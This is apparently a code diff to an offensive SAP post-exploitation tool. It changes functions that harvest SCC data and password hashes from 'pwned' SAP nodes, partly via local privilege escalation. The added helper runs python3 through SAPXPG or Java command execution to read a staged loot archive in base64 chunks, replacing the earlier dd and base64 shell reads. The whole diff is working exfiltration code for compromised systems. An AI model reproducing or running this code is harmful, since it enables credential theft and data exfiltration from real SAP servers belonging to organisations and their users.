@@ -110,6 +110,29 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
             logger.debug(f"harvest_scc [{sid}]: cmd failed: {format_rfc_exception(e)}")
         return ""
 
+    def _read_b64_chunk(path: str, offset: int, end: int) -> str:
+        """Read a file slice as base64 via python3 directly."""
+        code = (f"print(__import__('base64').b64encode("
+                f"open('{path}','rb').read()[{offset}:{end}])"
+                f".decode())")
+        try:
+            system_type = (node.system_type or "").upper()
+            if "JAVA" in system_type:
+                run_fn, _label, err = _build_java_os_exec(node)
+                if run_fn is None:
+                    return ""
+                r = run_fn("python3", f"-c {code}")
+            else:
+                r = run_os_command(node, "python3", f"-c {code}")
+            if r and r.get("success"):
+                for ln in (r.get("output") or []):
+                    ln = str(ln).strip()
+                    if ln and _B64_LINE_RE.fullmatch(ln):
+                        return ln
+        except Exception as e:
+            logger.debug(f"harvest_scc [{sid}]: b64 chunk: {format_rfc_exception(e)}")
+        return ""
+
     # ------------------------------------------------------------------
     # Bundle 1 — same-host SCC check
     # ------------------------------------------------------------------
@@ -401,18 +424,15 @@ def harvest_scc_from_pwned_node(node: SAPNode, state: SAPMAPState) -> dict:
                       f"(prefix={sudo_prefix!r})")
                 if sz <= 0:
                     return None
-                # sapxpg kernel 793+ truncates P4 output to ~128
-                # bytes per TLV block.  72 raw bytes → 96 b64 chars,
-                # well under the ceiling.  Must also be a multiple
-                # of 3 so intermediate chunks carry no '=' padding.
+                # Read via python3 directly (not dd|base64 via sh)
+                # to avoid SAPXPG TLV command-echo contamination.
                 _CHUNK = 72
                 chunks = []
                 offset = 0
                 while offset < sz:
-                    raw_out = _run_cmd(
-                        f'dd if=/tmp/.scc_loot.tgz bs=1 skip={offset} '
-                        f'count={_CHUNK} 2>/dev/null | base64 | tr -d "\\n"')
-                    cb64 = _b64_only(raw_out)
+                    end = min(offset + _CHUNK, sz)
+                    cb64 = _read_b64_chunk(
+                        "/tmp/.scc_loot.tgz", offset, end)
                     if not cb64:
                         break
                     chunks.append(cb64)
@@ -687,6 +707,40 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
                 f"{format_rfc_exception(e)}")
         return ""
 
+    def _read_b64_chunk(path: str, offset: int, end: int) -> str:
+        """Read a file slice as base64 via python3 called directly.
+
+        Bypasses /bin/sh -c to avoid SAPXPG TLV command-echo
+        contamination — the same proven pattern as
+        sap_pse_loot.make_chunked_read_adapter.
+        """
+        code = (f"print(__import__('base64').b64encode("
+                f"open('{path}','rb').read()[{offset}:{end}])"
+                f".decode())")
+        try:
+            system_type = (node.system_type or "").upper()
+            if "JAVA" in system_type:
+                run_fn, _label, err = _build_java_os_exec(node)
+                if run_fn is None:
+                    return ""
+                r = run_fn("python3", f"-c {code}")
+            else:
+                r = run_os_command(node, "python3", f"-c {code}")
+            if r and r.get("success"):
+                lines = r.get("output") or []
+                seen = set()
+                for ln in lines:
+                    ln = str(ln).strip()
+                    if (ln and ln not in seen
+                            and _B64_LINE_RE.fullmatch(ln)):
+                        return ln
+                    seen.add(ln)
+        except Exception as e:
+            logger.debug(
+                f"scc_hashes_via_lpe [{sid}]: b64 chunk failed: "
+                f"{format_rfc_exception(e)}")
+        return ""
+
     # ---- Phase 0: pre-flight — LPE must be viable BEFORE we touch SCC
     try:
         from sapmap_lpe_auto import check_linux_lpe, run_linux_lpe
@@ -789,10 +843,8 @@ def harvest_scc_hashes_via_lpe(node: SAPNode, state: SAPMAPState) -> dict:
     # the PSE-loot chunked-read adapter.
     progress_every = max(1, n_chunks // 10)
     for chunk_idx in range(1, n_chunks + 1):
-        raw_out = _run_cmd(
-            f'dd if={staging} bs=1 skip={offset} count={_CHUNK_RAW} '
-            f'2>/dev/null | base64 | tr -d "\\n"')
-        cb64 = _b64_only(raw_out)
+        end = min(offset + _CHUNK_RAW, sz)
+        cb64 = _read_b64_chunk(staging, offset, end)
         if not cb64:
             print(f"  [chunked] chunk {chunk_idx}/{n_chunks} returned "
                   f"empty — aborting read-back")
